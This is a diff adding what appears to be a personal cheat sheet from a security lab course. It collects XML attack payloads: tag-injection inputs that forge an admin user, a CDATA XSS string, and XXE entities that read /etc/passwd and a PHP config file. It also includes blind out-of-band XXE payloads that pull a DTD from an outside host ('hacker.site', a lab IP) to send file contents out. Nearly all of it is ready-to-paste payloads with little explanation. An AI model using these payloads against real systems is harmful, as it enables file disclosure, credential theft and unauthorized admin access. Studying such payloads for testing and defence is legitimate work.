@@ -1,0 +1,97 @@
+XML-XXE-XPATH
+
+Downloading xcat
+
+1.    Download get-pip.py from https://bootstrap.pypa.io/get-pip.py
+2.  Go to download directory.
+3.  Run ‘Python3 get-pip.py
+4.  Go to xcat install directory
+
+
+XML tag injection
+-------------------
+
+Name: useless
+Username: useless@yahoo.com</username></user><user><rule>1</rule><name>l33t</name><username>admin@yahoo.com
+Password: l33t
+
+Name: </name></user><user><rule>1<!--
+Username: --></rule><name>x</name><username>x
+Password: l33t
+
+Name: </name></user><user><rule{NEW LINE}>1<!--
+Username: --></rule{NEW LINE}><username>l33t
+Password: l33t
+
+<script><![CDATA[alert]]>('XSS')</script>
+-------------------
+
+XML XXE or (XML external entity)
+
+<?xml version="1.0" ?>
+<!DOCTYPE passwd [
+<!ELEMENT passwd ANY>
+<!ENTITY passwd SYSTEM "file:///etc/passwd">
+]>
+<passwd>&passwd;</passwd>
+
+
+----------------------
+
+Resource inclusion with php input/output streams and encoding
+
+<!DOCTYPE message [
+
+...
+<ENTITY xxefile SYSTEM "php://filter/read=convert.base64-encode/resource=file:///path/to/config.php">
+]>
+<message>
+...
+<body>&xxefile;</body>
+</message>
+
+------------------------
+
+Resource inclusion
+
+<!DOCTYPE message [
+...
+<!ENTITY xxefile SYSTEM "file:///etc/passwd">
+]>
+<message>
+...
+<body>&xxefile;</body>
+</message>
+
+-------------------------
+Working example of post request (XML Tab)
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE crimeTest [
+<!ENTITY fakeEntity SYSTEM "file:///etc/passwd">
+]>
+<login>
+  <username>matt..&fakeEntity;</username>
+  <password>poop...&fakeEntity;</password>
+</login>
+
+-------------------------------
+XXESERVE PROGRAM
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://10.100.13.200:8080/xml?f=/etc/passwd">
+%remote;
+%int;
+%trick;]>
+
+** This is a test for lab number 6 XML External entities (blind)
+
+<?xml version='1.0'?>
+<!DOCTYPE xxe [
+<!ENTITY % EvilDTD SYSTEM 'http://hacker.site/evil.dtd'>
+%EvilDTD;
+%LoadOOBEnt;
+%OOB;
+]>
+
